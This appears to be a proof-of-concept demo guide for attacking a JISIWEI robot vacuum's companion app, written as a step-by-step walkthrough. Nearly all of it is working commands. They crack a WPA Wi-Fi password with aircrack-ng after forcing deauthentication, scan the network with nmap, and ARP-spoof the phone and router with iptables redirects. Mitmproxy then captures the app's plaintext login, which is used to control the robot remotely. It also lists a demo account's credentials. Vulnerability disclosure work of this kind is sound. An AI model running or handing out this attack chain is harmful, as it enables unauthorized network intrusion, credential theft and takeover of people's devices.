# HOW TO DEMO

## Setup
A computer with these tools have to be fixed:
- **Android Emulator** or **Smartphone**, with the JISIWEI application installed. iOS app can be found here: https://apps.apple.com/us/app/极思维机器人/id937665306 and the APK file for the Android app is found in this repository.
- **aircrack-ng**, used for getting in to the network.
- **mitmproxy**, runned in transparent mode. Used for seeing the HTTP requests.
- **arpspoof**, for spoofing the network to get the packets.
- **nmap**, used for finding devices in the network.



## Step 1
Use Aircrack-ng with the wireless network adapter to crack the password to the router.

But first we have to set the wireless adapter to monitor mode, Either run the script **monitor_mode.sh** or do the following:
:
```
rfkill unblock all
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

We can then check what networks are available in the area:

```
airodump-ng wlan0
```

Take the BSSID and channel from the WIFI we will hack and do the following:
```
airodump-ng -c [channel for wifi] --bssid [BSSID for wifi] -w psk wlan0
```
We will now wait on a WPA handshake, we could make this process faster by taking a BSSID of a host that is connected to the wifi.
Easiest way to accomplish this is by having your smartphone connected to the wifi.

```
aireplay-ng -0 0 -a [BSSID of wifi] -c [BSSID of host] wlan0
```

When we have the handshake you can terminate the previous programs. 

Now use aircrack-ng with a password list and get the password.

```
aircrack-ng -w rockyou.txt -b [BSSID of wifi] psk*.cap
```

Now you can set the mode for the wireless adapter to Auto and then login to the wifi. Either run the script auto_mode.sh or do the following:

```
ifconfig wlan0 down
iwconfig wlan0 mode Auto
ifconfig wlan0 up
```

## Step 2
Login to the wifi.

Use Nmap to see the devices in the network.
```
nmap -sn 192.168.1.127/24
```
Check ports on all the devices found in the network. We will need the router and a phone.


## Step 3
Either run the script **spoof.sh** or do all the steps down below.

First we will setup port forwarding before using arpspoof and mitmproxy:

```
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

Then open make sure to have three terminals opened and each command in separate terminals:

```
arpspoof -i wlan0 -t [PHONE_IP] [ROUTER_IP]
arpspoof -i wlan0 -t [ROUTER_IP] [PHONE_IP] 
```

Start mitmproxy in transparent mode in the third terminal and wait till someone logs in to the robot on the same network.

```
mitmproxy --mode transparent --showhost
```

Use the emulator or smartphone and log in to the JISIWEI application while on the same network.

```
/root/Android/Sdk/emulator/emulator -avd Attacker 
```

Use the credentials:

username: hackmanhacker9@gmail.com

password: proofofconcept

When you have logged in you can see the credentials in the HTTP request. Meaning that the attacker now has access to those credentials and is now able to login to the app and controll the vacuum cleaner robot.

## Step 4

Login to the application using the smartphone or emulator showing that it is the same credentials and use the functions of the application.
The attacker could then login whenever they pleases without being in the network.